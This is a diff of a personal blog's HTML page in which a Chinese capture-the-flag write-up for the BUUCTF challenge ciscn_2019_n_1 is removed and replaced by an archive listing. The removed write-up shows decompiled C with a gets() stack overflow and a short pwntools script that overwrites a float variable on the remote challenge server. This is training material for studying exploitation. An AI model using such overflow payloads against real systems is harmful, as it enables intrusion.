@@ -154,156 +154,35 @@
 </script>
             <div class="main">
                 <div class="container">
-                    <article class="post-wrap">
-                        <header class="post-header">
-                            <h1 class="post-title">
-                                [BUUCTF]ciscn_2019_n_1 
-                            </h1>
+                    <div class="post-wrap archive">
+                        
                             
-                                <!--en-->
-                                <div class="post-meta en">
-                                    Author:
-                                    <a itemprop="author" rel="author" href="/">
-                                        「配枪朱丽叶 - 分部。」
-                                    </a>
-                                    <span class="post-time">
-                                Date: <a href="#">2021-07-11</a>
-                            </span>
-                                    <span class="post-readtime">Reading Time:<a
-                                    href="#">0.9
-                                    mins</a></span>
-                                    <span class="post-words">words:<a href="#">178</a></span>
-                                    
-                                        <span class="post-category">
-                                Category:
-                                
-                                <a href="https://shawr00t.github.io/HdcmhNKsB/">pwn</a>
-                                
-                            </span>
-                                        
-                                </div>
-                                
-                        </header>
-                        
-                        <div class="post-content">
-                            <p>checksec：</p>
-<pre><code>Arch:     amd64-64-little
-RELRO:    Partial RELRO
-Stack:    No canary found
-NX:       NX enabled
-PIE:      No PIE (0x400000)
-</code></pre>
-<p>main函数内容如下：</p>
-<pre><code class="language-c">int func()
-{
-  int result; // eax
-  char v1; // [rsp+0h] [rbp-30h]
-  float v2; // [rsp+2Ch] [rbp-4h]
-
-  v2 = 0.0;
-  puts(&quot;Let's guess the number.&quot;);
-  gets((__int64)&amp;v1);
-  if ( v2 == 11.28125 )
-    result = system(&quot;cat /flag&quot;);
-  else
-    result = puts(&quot;Its value should be 11.28125&quot;);
-  return result;
-}
-</code></pre>
-<p>是考察溢出又不是普通的考察溢出^^。<br>
-因为rbp-30h是存储<code>v1</code>的地址，rbp-4h是存储 <code>v2</code>的地址。<br>
-所以在(30h-4h）见填充'a'，在开始存储<code>v2</code>的地址处填入11.28125的十六进制数即可，十六进制的值在IDA里可以看见。<br>
-<img src="https://imgpp.com/images/2021/07/11/2021-07-11_205240.png" alt="2021-07-11_205240.png" loading="lazy"></p>
-<pre><code class="language-python">from pwn import *
-
-io = remote('node4.buuoj.cn','27329')
-payload = 'a'*(0x30-0x4)+p64(0x41348000)
-io.sendline(payload)
-io.interactive()
-</code></pre>
-
-                        </div>
-                        
+                                <h3>
+                                    2021
+                                </h3>
                                 
                                     
-                                        <!--en-->
-                                        <section class="post-copyright en">
-                                            <p class="copyright-item">
-                                                <span>Author:</span>
-                                                <span>「配枪朱丽叶 - 分部。」</span>
-                                            </p>
 
-                                            <p class="copyright-item">
-                                                <span>Permalink:</span>
-                                                <span><a href="https://shawr00t.github.io/buuctfciscn_2019_n_1/">https://shawr00t.github.io/buuctfciscn_2019_n_1/</a></span>
-                                            </p>
-
-                                            <p class="copyright-item">
-                                                <span>License:</span>
-                                                <span>MIT License</span>
-                                            </p>
-                                        </section>
+                                        <article class="archive-item">
+                                            <a class="archive-item-link" href="https://shawr00t.github.io/pwn-huan-jing-da-jian/">
+                                                PWN环境搭建
+                                            </a>
+                                            <span class="archive-item-date">2021-06-25 </span>
+                                        </article>
                                         
-                                                
-                                                    
-                                                        <!-- Share-->
-                                                        <span style="margin-right:15px">
-                                                    <i class="post-share"></i>
-                                                    <span>Share:</span>
-                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://shawr00t.github.io/buuctfciscn_2019_n_1/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://shawr00t.github.io/buuctfciscn_2019_n_1/&sharesource=qzone&title=[BUUCTF]ciscn_2019_n_1 &pics=https://shawr00t.github.io/images/avatar.png?v=1627225218702&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://shawr00t.github.io/buuctfciscn_2019_n_1/&sharesource=weibo&title=[BUUCTF]ciscn_2019_n_1  + " - " + &pic="https://shawr00t.github.io/images/avatar.png?v=1627225218702 "><i class="fa fa-weibo "></i></a>
-                                                        
-                                                            <div class="reward ">
-                                                                <div class="reward-button ">&yen;
-                                                                    <span class="reward-code "> 
-                                                                <span class="alipay-code "> <img class="alipay-img " alt = "support " src="https://imgpp.com/images/2021/07/01/_20210702113052.jpg"><b>Alipay</b> </span>
-                                                                    <span class="wechat-code "> <img alt ="support " class="wechat-img " src="https://imgpp.com/images/2021/07/01/_20210702113049.png"><b>Wechat</b> </span> </span>
-                                                                </div>
-                                                            </div>
-                                                            
-                                                                </span>
-                                                                <!--en-->
-                                                                <section class="post-tags en ">
-                                                                    <div>
-                                                                        <span>Tag(s):</span>
-                                                                        <span class="tag ">
-                        
-                        
-                        <a href="https://shawr00t.github.io/HdcmhNKsB/">#
-                                                pwn
-                                                    </a>
-                                                    
-                                                        
-                                                            </span>
-                                                                    </div>
-                                                                    <div>
-                                                                        <a href="javascript:window.history.back();">back</a>
-                                                                        <span>&dot;</span>
-                                                                        <a href="#">home</a>
-                                                                    </div>
-                                                                </section>
-                                                                
-                                                                                <!---->
-                                                                                <section class="post-nav">
-                                                                                    
-                                                                                        <a class="prev" rel="prev" href="https://shawr00t.github.io/pwnret2syscall-xue-xi-bi-ji/">
-                                                                                            [PWN]ret2syscall 学习笔记
-                                                                                        </a>
-                                                                                        
-                                                                                            
-                                                                                                <a class="next" rel="next" href="https://shawr00t.github.io/xmanpwn-level1/">
-                                                                                                    [XMAN]pwn level1   
-                                                                                                </a>
-                                                                                                
-                                                                                </section>
-                    </article>
-                </div>
-                
                                             
+                                                
+                    </div>
+                    <div class="pagination-container">
+                        
+                                                
+                                                    <a href="https://shawr00t.github.io/HdcmhNKsB/page/2/" class="prev"><i class="icon-arrow-ios-back-outline"></i> Prev</a>
+                                                    
+                                                        
+                                                                
+                    </div>
+                </div>
             </div>
-    </div>
-    </div>
     </div>
     
         <footer id="footer" class="footer">
@@ -359,8 +238,5 @@ io.interactive()
                 
         </div>
 </body>
-<script>
-    scroll();
-</script>
 
 </html>
